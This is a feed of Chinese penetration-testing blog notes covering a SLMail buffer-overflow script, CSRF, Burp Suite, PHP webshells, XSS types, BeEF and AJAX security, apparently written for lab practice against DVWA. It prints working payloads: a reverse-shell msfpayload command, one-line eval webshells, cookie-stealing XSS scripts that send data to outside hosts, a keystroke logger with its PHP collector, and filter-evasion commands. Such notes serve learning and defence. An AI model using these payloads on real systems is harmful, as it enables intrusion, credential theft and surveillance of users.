class="number">110</span>))</span><br><span class="line">date=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'PASS '</span>+buffer+<span class="string">'\r\n'</span>)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure><p>shellcode执行结束后以ExitProcess方式推出整个进程,将导致邮件服务崩溃；<br>Slmail是一个基于线程的应用,适用ExitThread方式可以避免整个服务崩溃,可实现重复溢出；<br><code>./msfpayload win32_reverse lhost=1.1.1.1 EXITFUNC=thread lport=443 R | ./msfencode -b &quot;\x00\x0a\x0d&quot;</code><br>    cmd注册表开启3389<br>    <code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code><br>    RegSnap #工具</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 缓冲区溢出 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 缓冲区溢出 </tag>
            
            <tag> 漏洞利用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF跨站请求伪造与XSS在区别</title>
      <link href="/2014/06/01/Web_Attacks/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E4%B8%8EXSS%E5%9C%A8%E5%8C%BA%E5%88%AB/"/>
      <url>/2014/06/01/Web_Attacks/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E4%B8%8EXSS%E5%9C%A8%E5%8C%BA%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<blockquote><h4 id="CSRF-Cross-site-request-forgery"><a href="#CSRF-Cross-site-request-forgery" class="headerlink" title="CSRF    (Cross-site request forgery)"></a><strong>CSRF</strong>    (Cross-site request forgery)</h4><p>跨站请求伪造</p></blockquote><ul><li><p>与XSS经常混淆</p></li><li><p>从信任的角度来区分</p><ul><li>XSS:利用用户对站点的信任</li><li>CSRF:利用站点对已经身份认证的信任</li></ul></li><li><p>结合社工在身份认证会话过程中实现攻击</p><ul><li>修改账号密码,个人信息(Email,收货地址)</li><li>发送伪造的业务请求,(网银,购物,投票)</li><li>关注他人社交账号,推送博文</li><li>在用户非自愿,不知情的情况下提交请求</li></ul></li><li><p><strong>业务逻辑漏洞</strong></p></li><li><p>对关键操作缺少确认机制</p></li><li><p>自动扫描程序无法发现此类漏洞</p></li><li><p><strong>漏洞利用条件</strong></p><ul><li>被害用户已经完成身份认证</li><li>新请求的提交不需要重新身份认证或确认机制</li><li>攻击者必须了解Web APP请求的参数构造</li><li>诱使用户触发攻击的指令(社工)</li></ul></li><li><p>Burpsuite CSRF PoC generator</p><ul><li>Post / Get 方法</li></ul></li><li><p><strong>自动扫描程序的检测方法</strong></p><ul><li>在请求和响应过程中检查是否存在anti-CSRF token 名</li><li>检查服务器是否验证anti-CSRF token的名值</li><li>检查token中可编辑的字符串</li><li>检查referrer头是否可以伪造</li></ul></li></ul><p><strong>对策</strong><br>    * Captcha<br>    * anti-CSRF token<br>    * Referrer头<br>    * 降低会话超时时间 </p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> Web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
            <tag> Burpsuite </tag>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Burpsuite代理截断Web安全工具</title>
      <link href="/2014/05/30/Web_Attacks/Burpsuite%E4%BB%A3%E7%90%86%E6%88%AA%E6%96%ADWeb%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
      <url>/2014/05/30/Web_Attacks/Burpsuite%E4%BB%A3%E7%90%86%E6%88%AA%E6%96%ADWeb%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h4 id="Burpsuite"><a href="#Burpsuite" class="headerlink" title="Burpsuite"></a><strong>Burpsuite</strong></h4><ul><li>Web安全工具中的瑞士军刀</li><li>统一的集成工具发现全部现代WEB安全漏洞</li><li>PortSwigger公司开发<ul><li>Burp Free</li><li>Burp Professional</li><li><code>http://www.portswigger.net</code></li></ul></li><li>所有的工具共享一个能处理并显示HTTP消息的可扩展框架,模块之间无缝交换信息.</li></ul><p><strong>Proxy</strong><br>    * Options<br>        * invisible(主机头/多目标域名)<br>        * CA(导入/导出)<br>        * Intercept(入站/出站)<br>        * Response modify<br>    * Target<br>        * Scope(logout)<br>        * Filter<br>        * Comparing site map</p><ul><li>Active / Passive Scan</li><li>Extender<ul><li>BApp Store<ul><li>Jython</li><li><code>http://www.jython.org/downloads.html</code></li></ul></li><li>Option</li><li>Scan queue</li><li>Resuit</li></ul></li></ul><p><strong>Burpsuite–intruder</strong>        #payloads爆破攻击模块</p><ul><li>POSITION<ul><li>Sniper                #逐一取payloads值破解,如有多变量,依次尝试破解</li><li>Battering ram        #多变量取payloads同一值进行破解</li><li>Pitchfork            #取payloads不同字典,对应不同变量进行破解,常用于账号密码破解</li><li>Cluster bomb        #非一对一关系,全交叉模式破解</li></ul></li></ul><p><strong>Burpsuite–Repeater</strong>    #手动注入测试最常用的功能</p><ul><li>Repeater        #中继器,用于请求重放<ul><li>Request History</li><li>Change request method</li><li>Change body encoding</li><li>Copy as curl command</li><li>Convert selection</li></ul></li><li>Repeater菜单<ul><li>Engagement tools–generate crrf PoC</li><li>Follow redirections</li><li>Process cookies in redirections</li></ul></li></ul><p><strong>Burpsuite–Sequencer</strong></p><ul><li>分析程序中可预测的数据<ul><li>Session cookies</li><li>anti-CSRF tokens</li><li>Start live capture<ul><li>Analyze(数据越多分析越准确)</li><li>伪随机数算法</li><li>Character-level</li><li>Bit-level</li></ul></li><li>FIPS–美国联邦信息处理标准(Federal Information Processing Standard)</li></ul></li></ul><p><strong>Burpsuite–Decoder</strong><br>    * Decoder        #编码<br>        * 使用各种编码绕过服务器端输入过滤<br>        * smart decode</p><ul><li>其它代理截断工具<ul><li>Paros        #历史最早出现的代理截断工具,Burpsuite,ZAP都是后续模仿Paros</li><li>Webscrab    #类似Burpsuite</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> Web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Burpsuite </tag>
            
            <tag> Paros </tag>
            
            <tag> Webscrab </tag>
            
            <tag> 代理截断工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一句话木马及Kali常用WebShell</title>
      <link href="/2014/05/26/Web_Attacks/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%8F%8A%E5%B8%B8%E7%94%A8WebShell/"/>
      <url>/2014/05/26/Web_Attacks/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%8F%8A%E5%B8%B8%E7%94%A8WebShell/</url>
      
        <content type="html"><![CDATA[<h4 id="PHP一句话webshell"><a href="#PHP一句话webshell" class="headerlink" title="PHP一句话webshell"></a>PHP一句话webshell</h4><pre><code>&lt;?php echo shell_exec($_GET[&apos;cmd&apos;]);?&gt;&lt;?php @eval($_POST[&apos;chopper&apos;]);?&gt;</code></pre><ul><li><p>中国菜刀: <code>http://www.maicaidao.co/</code></p></li><li><p>可能被IDS,AV,WAF,扫描器软件发现查杀</p></li><li><p><strong>WeBaCoo</strong> (Web Backdoor Cookie)</p><ul><li>类终端的shell</li><li>编码通信内容通过cookie头传输,隐蔽性较强</li><li>cm:base64编码的命令</li><li>cn:服务器用于返回数据的cookie头的名</li><li>cp:返回信息定界符</li></ul></li><li><p>生成服务端</p><ul><li>webacoo -g -o a.php</li><li>客户端连接<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webacoo -t -u http:&#x2F;&#x2F;1.1.1.1&#x2F;a.php</span><br></pre></td></tr></table></figure></li></ul></li></ul><ul><li><strong>Weevely</strong><ul><li>隐蔽的类终端PHP Webshell</li><li>30多个管理模块<ul><li>执行系统命令,浏览文件系统</li><li>检查服务器常见配置错误</li><li>创建正向,反向TCP Shell连接</li><li>通过目标计算机代理HTTP流量</li><li>从目标计算机运行端口扫描,渗透内网</li></ul></li><li>支持连接密码</li><li>Kali缺少库  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;pypl.python.org&#x2F;pypi&#x2F;PySocks&#x2F;</span><br><span class="line">.&#x2F;setup.py install</span><br></pre></td></tr></table></figure></li><li>生成服务端  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">weevely generate &lt;password&gt; b.php</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;weevely&#x2F;b.php</span><br></pre></td></tr></table></figure></li><li>客户端连接服务器  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weevely http:&#x2F;&#x2F;1.1.1.1&#x2F;b.php &lt;password&gt;id</span><br></pre></td></tr></table></figure></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> Web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webshell </tag>
            
            <tag> 中国菜刀 </tag>
            
            <tag> webacoo </tag>
            
            <tag> weevely </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>存储型XSS和DOM型XSS</title>
      <link href="/2014/05/25/Web_Attacks/XSS/%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E5%92%8CDOM%E5%9E%8BXSS/"/>
      <url>/2014/05/25/Web_Attacks/XSS/%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E5%92%8CDOM%E5%9E%8BXSS/</url>
      
        <content type="html"><![CDATA[<h4 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a><strong>存储型XSS</strong></h4><ul><li><p>长期存储于服务器端</p></li><li><p>每次用户访问都会被执行javascript脚本</p></li><li><p>Name:客户端表单长度限制</p><ul><li>客户端,截断代理</li><li><code>&lt;script src=http://1.1.1.1/a.js&gt;&lt;/script&gt;</code></li><li>a.js源码  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var img &#x3D; new Image(); </span><br><span class="line">img.src &#x3D; &quot;http:&#x2F;&#x2F;1.1.1.1:88&#x2F;cookies.php?cookie&#x3D;&quot;+document.cookie;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a><strong>DOM型XSS</strong></h4><ul><li>一套JS和其它语言可调用的标准的API  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PageDocument object</span><br><span class="line">Element1obj1</span><br><span class="line">Element2obj2</span><br><span class="line">Element3obj3</span><br><span class="line"></span><br><span class="line">&lt;script&gt;var img&#x3D;document.createElement(&quot;img&quot;);img.src&#x3D;&quot;http:&#x2F;&#x2F; 192.168.20.8:88&#x2F;log?&quot;+escape(document.cookie);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> Web渗透 </category>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
            <tag> 跨站脚本漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反射型XSS跨站脚本漏洞检测和攻击利用</title>
      <link href="/2014/05/24/Web_Attacks/XSS/%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%92%8C%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8/"/>
      <url>/2014/05/24/Web_Attacks/XSS/%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%92%8C%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h4 id="XSS跨站脚本漏洞检测和攻击利用"><a href="#XSS跨站脚本漏洞检测和攻击利用" class="headerlink" title="XSS跨站脚本漏洞检测和攻击利用"></a><strong>XSS跨站脚本漏洞检测和攻击利用</strong></h4><ul><li>攻击WEB客户端</li><li>客户端脚本语言<ul><li>弹窗告警,广告</li><li>Javascript</li><li>在浏览器中执行</li></ul></li></ul><p><strong>XSS</strong>(cross-site scripting)</p><ul><li><p>通过WEB站点漏洞,向客户端交付恶意脚本代码,实现对客户端的攻击目的</p></li><li><p>注入客户端脚本代码</p></li><li><p>盗取cookie</p></li><li><p>重定向</p></li><li><p>VBScript,Activex,or Flash</p></li><li><p><strong>JavaScript</strong></p><ul><li>与Java语言无关</li><li>命名完全出于市场因素</li><li>使用最广的客户端脚本语言</li></ul></li><li><p>使用场景</p><ul><li>直接嵌入html: <code>&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;</code></li><li>元素标签事件: <code>&lt;body onload=alert(&#39;XSS&#39;)&gt;</code></li><li>图片标签: <code>&lt;img src=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;</code></li><li>其它标签: <code>&lt;iframe&gt;,&lt;div&gt;,and &lt;link&gt;</code></li><li>DOM对象,篡改页面内容</li></ul></li></ul><p><strong>攻击参与方</strong><br>    * 攻击者<br>    * 被攻击者<br>    * 漏洞站点<br>    * 第三方站点(攻击目标,攻击参与站)</p><p><strong>漏洞形成的根源</strong><br>    * 服务器对用户提交数据过滤不严<br>    * 提交给服务器的脚本被直接返回给其他客户端执行<br>    * 脚本在客户端执行恶意操作</p><h4 id="XSS漏洞类型"><a href="#XSS漏洞类型" class="headerlink" title="XSS漏洞类型"></a><strong>XSS漏洞类型</strong></h4><ul><li>存储型(持久型)</li><li>反射型(非持久)</li><li>DOM型</li></ul><p><strong>漏洞PoC</strong></p><ul><li><p>检测漏洞存在</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;</span><br><span class="line">&lt;a href&#x3D;&#39;&#39; onclick&#x3D;alert(&#39;xss&#39;)&gt;type&lt;&#x2F;a&gt;</span><br><span class="line">&lt;img src&#x3D;http:&#x2F;&#x2F;1.1.1.1&#x2F;a.jpg onerror&#x3D;alert(&#39;xss&#39;)&gt;</span><br></pre></td></tr></table></figure></li><li><p>重定向</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.location&#x3D;&#39;http:&#x2F;&#x2F;1.1.1.1&#39;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;iframe SRC&#x3D;&quot;http:&#x2F;&#x2F;1.1.1.1&#x2F;victim&quot; height &#x3D; &quot;0&quot; width &#x3D;&quot;0&quot;&gt;&lt;&#x2F;iframe&gt;</span><br></pre></td></tr></table></figure></li><li><p>篡改页面</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;document.body.innerHTML&#x3D;&quot;&lt;div style&#x3D;visibility:visible;&gt;&lt;h1&gt;THIS WEBSITE IS UNDER ATTACK&lt;&#x2F;h1&gt;&lt;&#x2F;div&gt;&quot;;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure></li><li><p>Cookie窃取</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;new Image().src&#x3D;&quot;http:&#x2F;&#x2F;1.1.1.1&#x2F;c.php? output&#x3D;&quot;+document.cookie;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src&#x3D;http:&#x2F;&#x2F;1.1.1.1&#x2F;a.js&gt;&lt;&#x2F;script&gt; </span><br><span class="line">a.js源码</span><br><span class="line">var img &#x3D; new Image();</span><br><span class="line">img.src &#x3D; &quot;http:&#x2F;&#x2F;1.1.1.1&#x2F;cookies.php?cookie&#x3D;&quot;+document.cookie;</span><br></pre></td></tr></table></figure></li><li><p><code>Keylogger.js</code></p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">document.onkeypress&#x3D;function(evt)&#123;</span><br><span class="line">evt&#x3D;evt || window.event</span><br><span class="line">key&#x3D;String.fromCharCode(evt.charCode)</span><br><span class="line">if(key)&#123;</span><br><span class="line">var http&#x3D;new XMLHttpRequest();</span><br><span class="line">var param&#x3D;encodeURI(key)</span><br><span class="line">http.open(&quot;POST&quot;,&quot;http:&#x2F;&#x2F;192.168.190.163&#x2F;keylogger.php&quot;,true);</span><br><span class="line">http.setRequestHeader(&quot;Content-type&quot;,&quot;application&#x2F;x-www-form-urlencoded&quot;);</span><br><span class="line">http.send(&quot;keky&#x3D;&quot;+param);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>Keylogger.php</code></p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$key&#x3D;$_POST[&#39;key&#39;];</span><br><span class="line">$logfile&#x3D;&quot;keylog.txt&quot;;</span><br><span class="line">$fp&#x3D;fopen($logfile,&quot;a&quot;);</span><br><span class="line">fwrite($fp,$key);</span><br><span class="line">fclose($fp);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;script+src&#x3D;&quot;http:&#x2F;&#x2F;1.1.1.1&#x2F;keylogger.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;192.168.20.10&#x2F;dvwa&#x2F;vulnerabilities&#x2F;xss_r&#x2F;?name&#x3D;&lt;script +src&#x3D;&#39;http:&#x2F;&#x2F;192.168.20.8&#x2F;keylogger.js&#39;&gt;&lt;&#x2F;script&gt;&quot;&gt;xss&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure></li></ul><h4 id="Xsser"><a href="#Xsser" class="headerlink" title="Xsser"></a><strong>Xsser</strong></h4><ul><li><p>命令行/图形化工具</p></li><li><p>绕过服务器端输入筛选</p><ul><li>10进制/16进制编码</li><li>unescape()<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xsser -u &quot;http:&#x2F;&#x2F;1.1.1.1&#x2F;dvwa&#x2F;vulnerabilities&#x2F;&quot; -g &quot;xss_r&#x2F;?name&#x3D;&quot; -cookie&#x3D;&quot;security&#x3D;low; PHPSESSID&#x3D;d23e469411707ff8210717e67c521a81&quot; -s -v  --reverse-check</span><br><span class="line"></span><br><span class="line">--heuristic 检查被过滤的字符</span><br></pre></td></tr></table></figure></li></ul></li><li><p>对payload编码,绕过服务器端筛选过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">--Str     Use method String.FromCharCode()</span><br><span class="line">--Une   Use Unescape() function</span><br><span class="line">--Mix   Mix String.FromCharCode() and Unescape()</span><br><span class="line">--Dec   Use Decimal encoding</span><br><span class="line">--Hex   Use Hexadecimal encoding</span><br><span class="line">--Hes   Use Hexadecimal encoding, with semicolons</span><br><span class="line">--Dwo   Encode vectors IP addresses in DWORD</span><br><span class="line">--Doo   Encode vectors IP addresses in Octal</span><br><span class="line">--Cem&#x3D;CEM Try -manually- different Character Encoding Mutations </span><br><span class="line">(reverse obfuscation: good) -&gt; (ex: &#39;Mix,Une,Str,Hex&#39;)</span><br><span class="line">注入技术(多选)</span><br><span class="line">--Coo   Cross Site Scripting Cookie injection</span><br><span class="line">--Xsa   Cross Site Agent Scripting</span><br><span class="line">--Xsr    Cross Site Referer Scripting</span><br><span class="line">--Dcp   Data Control Protocol injections</span><br><span class="line">--Dom   Document Object Model injections</span><br><span class="line">--Ind   HTTP Response Splitting Induced code</span><br><span class="line">--Anchor  Use Anchor Stealth payloader (DOM shadows!)</span><br><span class="line">--Phpids  PHP - Exploit PHPIDS bug (0.6.5) to bypass filters</span><br><span class="line">--Doss   XSS Denial of service (server) injection</span><br><span class="line">--Dos   XSS Denial of service (client) injection</span><br><span class="line">--B64   Base64 code encoding in META tag (rfc2397)</span><br><span class="line">--Onm   ONM - Use onMouseMove() event to inject code</span><br><span class="line">--Ifr    Use &lt;iframe&gt; source tag to inject code</span><br></pre></td></tr></table></figure></li></ul><p><code>htmlspecialchars()</code></p><ul><li>输出html编码&lt; &gt; &lt; &gt;<br><code>xsser -u &quot;http://1.1.1.1/dvwa/vulnerabilities/&quot; -g &quot;xss_r/?name=&quot; -cookie=&quot;security=high; PHPSESSID=d23e469411707ff8210717e67c521a81&quot; -Cem=&#39;Mix,Une,Str,Hex&#39;</code></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> Web渗透 </category>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
            <tag> 跨站脚本漏洞 </tag>
            
            <tag> Xsser </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BEFF浏览器XSS攻击框架</title>
      <link href="/2014/05/23/Web_Attacks/XSS/BeFF%E6%B5%8F%E8%A7%88%E5%99%A8XSS%E6%94%BB%E5%87%BB%E6%A1%86%E6%9E%B6/"/>
      <url>/2014/05/23/Web_Attacks/XSS/BeFF%E6%B5%8F%E8%A7%88%E5%99%A8XSS%E6%94%BB%E5%87%BB%E6%A1%86%E6%9E%B6/</url>
      
        <content type="html"><![CDATA[<h4 id="BEEF"><a href="#BEEF" class="headerlink" title="BEEF"></a><strong>BEEF</strong></h4><ul><li><p>浏览器攻击面</p><ul><li>应用普遍转移到B / S架构,浏览器成为统一客户端程序</li><li>结合社会工程学方法对浏览器进行攻击</li><li>攻击浏览器用户</li><li>通过注入的JS脚本,利用浏览器攻击其它网站</li></ul></li><li><p>BEEF(Browser exploitation framework)</p><ul><li>生成,交付payload</li><li>Ruby语言编写</li><li>服务器端:管理hooked客户端</li><li>客户端:运行于客户端浏览器的Javascript脚本(hook)</li></ul></li><li><p>攻击手段</p><ul><li>利用网站xss漏洞实现攻击</li><li>诱使客户端访问含有hook的伪造站点</li><li>结合中间人攻击注入hook脚本</li></ul></li><li><p>常见用途</p><ul><li>键盘纪录器</li><li>网络扫描</li><li>浏览器信息收集</li><li>绑定shell</li><li>与metasploit集成</li></ul></li><li><p>演示页面: <code>http://&lt;IP_BeEF_Server&gt;:3000/demos/basic.html</code></p></li><li><p>Details:</p><ul><li>浏览器,插件版本信息；操作系统信息</li></ul></li><li><p>Logs:</p><ul><li>浏览器动作:焦点变化,鼠标点击,信息输入</li></ul></li><li><p>Commands:命令模块</p><ul><li>绿色模块:表示模块适合目标浏览器,并且执行结果被客户端不可见</li><li>红色模块:表示模块不适用于当前用户,有些红色模块也可正常执行</li><li>橙色模块:模块可用,但结果对用户可见(CAM弹窗申请权限等)</li><li>灰色模块:模块未在目标浏览器上测试过</li></ul></li><li><p><strong>主要模块</strong></p><ul><li>Browsers</li><li>Exploits</li><li>Host</li><li>Persistence        #持久化</li><li>Network</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> Web渗透 </category>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
            <tag> BEFF </tag>
            
            <tag> Ruby </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AJAX技术组合及WebService安全考虑</title>
      <link href="/2014/05/21/Web_Attacks/AJAX%E6%8A%80%E6%9C%AF%E7%BB%84%E5%90%88%E5%8F%8AWebService%E5%AE%89%E5%85%A8%E8%80%83%E8%99%91/"/>
      <url>/2014/05/21/Web_Attacks/AJAX%E6%8A%80%E6%9C%AF%E7%BB%84%E5%90%88%E5%8F%8AWebService%E5%AE%89%E5%85%A8%E8%80%83%E8%99%91/</url>
      
        <content type="html"><![CDATA[<h4 id="AJAX-Asynchronous-Javascript-and-XML-异步JS和XML"><a href="#AJAX-Asynchronous-Javascript-and-XML-异步JS和XML" class="headerlink" title="AJAX (Asynchronous Javascript and XML)        //异步JS和XML"></a><strong>AJAX</strong> (Asynchronous Javascript and XML)        //异步JS和XML</h4><ul><li>是一个概念,而非一种新的编程语言,是一组现有技术的组合</li><li>通过客户端脚本动态更新页面部分内容,而非整个页面</li><li>降低带宽使用,提高速度</li><li>提升用户体验</li><li>后台异步访问</li></ul><p><strong>AJAX组件</strong><br>JavaScript: ajax的核心组件,使用XMLHTTPRequest 对象接口向服务器发起请求,接收并处理服务器响应数据</p><p><strong>Dynamic HTML</strong>(DHTML)<br>早于AJAX出现,通过Javascript,CSS等在客户端修改HTML页面element,缺点是完全依赖客户端代码修改页面,与服务器<br>的交互由JavaScript applets完成,AJAX的XHR弥补了他的缺点(注册用户)</p><p><strong>Document Object Model(DOM)</strong><br>处理html,xml文档对象的框架,DHTML是一个浏览器,DOM作为其一个实现的接口,定义和管理每个页面元素obj的Properties,method,event.</p><p><strong>基于AJAX的WEB应用工作流程</strong></p><ul><li><p>XMLHTTPRequest API创建对象xmlhttp进行访问</p></li><li><p>XML,json,html,文本,图片</p></li><li><p>多个异步请求独立通信,互不依赖</p></li><li><p>AJAX框架</p><ul><li>JQuery</li><li>Dojo Toolkit</li><li>Google web toolkit(GWT)</li><li>Microsoft AJAX library</li></ul></li><li><p>目前没有通用的AJAX安全最佳实践,其攻击面不为大多数人所知</p></li><li><p>AJAX的安全问题</p></li><li><p>多种技术混合,增加了攻击面,每个参数都可能形成独立的攻击过程</p></li><li><p>AJAX引擎是个全功能的脚本解释器,访问恶意站点可能后果严重,虽然浏览器有砂箱和SOP,但可被绕过</p></li><li><p>服务器,客户端代码结合使用产生混乱,服务器访问控制不当,将信息泄露</p></li><li><p>暴露应用程序逻辑</p></li></ul><h4 id="AJAX对渗透测试的挑战"><a href="#AJAX对渗透测试的挑战" class="headerlink" title="AJAX对渗透测试的挑战"></a><strong>AJAX对渗透测试的挑战</strong></h4><ul><li>异步请求数量多且隐蔽</li><li>触发AJAX请求的条件无规律</li><li>手动和截断代理爬网可能产生大量遗漏</li><li>AJAX爬网工具<ul><li>ZAP</li></ul></li><li>客户端代码审计<ul><li>源码</li><li>firebug</li></ul></li></ul><h4 id="WEB-Service"><a href="#WEB-Service" class="headerlink" title="WEB Service"></a><strong>WEB Service</strong></h4><ul><li>面向服务的架构(Service Oriented Architecture)便于不同系统集成共享数据和功能</li><li>尤其适合不想暴漏数据模型和程序逻辑而访问数据的场景</li><li>无页面</li></ul><p><strong>两种类型WEB Service</strong></p><ol><li>Simple Object Access Protosol(SOAP)        //简单对象访问协议<ul><li>传统的Web service开发方法,xml是唯一的数据交换格式</li><li>要求安全性的应用更多采用</li></ul></li><li>RESTful(Representational State Transfer architecture) REST        //代表性状态传输架构<ul><li>目前更多被采用的轻量web service,JSON是首选数据交换格式</li></ul></li></ol><h4 id="WEB-Service安全考虑"><a href="#WEB-Service安全考虑" class="headerlink" title="WEB Service安全考虑"></a><strong>WEB Service安全考虑</strong></h4><p>使用API key或session token实现和跟踪身份认证<br>身份认证由服务器完成,而非客户端<br>API key,用户名,Session token永远不要通过URL发送<br>RESTful默认不提供任何安全机制,需要使用SSL/TLS保护传输数据安全<br>SOAP提供强于HTTPS的WS-security机制<br>使用OAuth或HMAC进行身份验证,HMAC身份认证使用C/S共享的密钥加密API 